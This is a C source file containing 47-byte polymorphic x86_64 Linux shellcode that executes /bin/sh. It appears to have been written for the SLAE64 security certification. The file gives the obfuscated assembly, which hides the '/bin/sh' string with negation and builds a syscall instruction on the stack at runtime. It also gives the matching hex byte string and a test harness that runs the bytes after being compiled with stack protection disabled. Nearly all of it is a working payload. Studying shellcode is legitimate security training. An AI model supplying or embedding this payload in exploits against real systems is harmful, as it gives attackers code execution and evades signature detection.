/*---------------------------------------------------------------------------------------------------------------------
/*
*Title:            x86_64 linux Polymorphic execve-stack 47 bytes
*Author:           Sathish kumar
*Contact:          https://www.linkedin.com/in/sathish94
* Copyright:       (c) 2016 iQube. (http://iQube.io)
* Release Date:    January 6, 2016
*Description:      X86_64 linux Polymorphic execve-stack 47 bytes
*Tested On:        Ubuntu 14.04 LTS
*SLAE64-1408
*Build/Run:        gcc -fno-stack-protector -z execstack sellcode.c -o shellcode
*                   ./shellcode
*
global _start

_start:

    xor esi, esi
    xor r15, r15
    mov r15w, 0x161f
    sub r15w, 0x1110
    push r15
    mov r15, rsp
    mov rdi, 0xff978cd091969dd0
    inc rdi
    neg rdi
    mul esi
    add al, 0x3b
    push rdi
    push rsp
    pop rdi
    call r15
*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xf6\x4d\x31\xff\x66\x41\xbf\x1f\x16\x66\x41\x81\xef\x10\x11\x41\x57\x49\x89\xe7\x48\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xff\xc7\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x41\xff\xd7";
main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

